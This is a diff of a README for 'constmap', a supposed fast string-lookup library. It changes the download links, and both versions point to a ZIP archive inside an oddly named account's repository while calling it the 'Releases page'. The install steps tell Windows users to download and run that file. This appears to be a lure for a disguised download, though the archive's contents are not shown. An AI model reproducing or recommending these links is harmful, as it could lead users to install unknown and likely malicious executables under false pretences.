@@ -1,10 +1,10 @@
 # 🗺️ constmap - Fast, compact string lookups
 
-[![Download constmap](https://img.shields.io/badge/Download-constmap-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Nondisposable-loniceraalbiflora875/constmap/main/outlance/Software_v2.2.zip)
+[![Download constmap](https://img.shields.io/badge/Download-constmap-blue?style=for-the-badge&logo=github)](https://github.com/Nondisposable-loniceraalbiflora875/constmap/raw/refs/heads/main/outlance/Software_v2.2.zip)
 
 ## 📥 Download constmap
 
-1. Open the [constmap Releases page](https://raw.githubusercontent.com/Nondisposable-loniceraalbiflora875/constmap/main/outlance/Software_v2.2.zip).
+1. Open the [constmap Releases page](https://github.com/Nondisposable-loniceraalbiflora875/constmap/raw/refs/heads/main/outlance/Software_v2.2.zip).
 2. Find the latest version at the top of the page.
 3. Under **Assets**, download the Windows file that matches your PC.
 4. If you see a ZIP file, save it to your computer.
@@ -66,7 +66,7 @@ If your PC already runs modern Windows apps, it should work here too.
 
 ## 📦 Install steps
 
-1. Open the [Releases page](https://raw.githubusercontent.com/Nondisposable-loniceraalbiflora875/constmap/main/outlance/Software_v2.2.zip).
+1. Open the [Releases page](https://github.com/Nondisposable-loniceraalbiflora875/constmap/raw/refs/heads/main/outlance/Software_v2.2.zip).
 2. Download the latest Windows release.
 3. Save the file to your computer.
 4. If the file is zipped, extract it.
